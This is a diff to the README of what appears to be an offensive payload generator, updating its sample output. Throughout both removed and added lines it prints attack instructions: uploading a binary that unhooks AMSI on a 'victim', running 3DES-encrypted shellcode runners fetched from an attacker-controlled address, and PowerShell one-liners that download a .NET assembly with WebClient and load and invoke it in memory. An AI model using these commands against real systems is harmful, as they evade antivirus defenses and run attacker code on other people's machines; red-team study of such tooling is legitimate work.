@@ -300,25 +300,35 @@ If everything goes well, you will get an output as the following:
 [+] Creating web.config file (Non-Encrypted)...
 [+] Creating ASPX file (Non-Encrypted) ...
 [+] Unhooking AMSI ...
- [*] Upload unhook_amsi.exe and MinHook.NET.dll to the victim 
- [*] Files are unders: payloads/AMSI/
- [*] Execution: unhook_amsi.exe http://<KALI>/shellcode_runner.exe 
 [+] Generating a 3DES Shellcode Runner ...
- [*] Execution of 3DES ...
- [1] Example: des_decryptor.exe "http://<KALI>/shellcode_runner_assembly_3des.exe"
- [2] Example: des_decryptor_embeded.exe
 [+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...
 
- [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe
- [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
- [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
- [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
-/*--------------------------------------------------------------------*/
- [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.exe
- [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
- [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
- [*] PS>$ass.GetType("W8VME5GGM7.GU8I0TEEI0").GetMethod("T5HOQF3C9C").Invoke($null,$null)
-/*--------------------------------------------------------------------*/
+ _____________________________________________________________________________________________________________________________________
+|                                                     Unhooking AMSI                                                                  |
+|-------------------------------------------------------------------------------------------------------------------------------------|
+| [1] Upload unhook_amsi.exe and MinHook.NET.dll to the victim                                                                        |
+| [2] Execution: unhook_amsi.exe http://192.168.100.128/shellcode_runner.exe                                                          |
+|_____________________________________________________________________________________________________________________________________|
+
+ _____________________________________________________________________________________________________________________________________
+|                                                     Triple DES Execution                                                            |
+|-------------------------------------------------------------------------------------------------------------------------------------|
+| [1] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded.exe"                                                  |
+| [2] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded_marshal.exe"                                          |
+| [3] Example: des_decryptor_embeded.exe                                                                                              |
+| [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |
+|_____________________________________________________________________________________________________________________________________|
+
+ _____________________________________________________________________________________________________________________________________
+|                                          ConfuserEx  +  Net-Obfuscate Execution                                                     |
+|-------------------------------------------------------------------------------------------------------------------------------------|
+| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                            |
+|                                                                                                                                     |
+| PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.100.128/shellcode_runner_assembly_numa.exe')                |
+| PS>$ass=[System.Reflection.Assembly]::Load($data)                                                                                   |
+| PS>$ass.GetType("2TU9JGT46F.3CA43C9768").GetMethod("TVT8MQU9ND").Invoke($null,$null)                                                |
+|-------------------------------------------------------------------------------------------------------------------------------------|
+
 ...More...
 ```
 
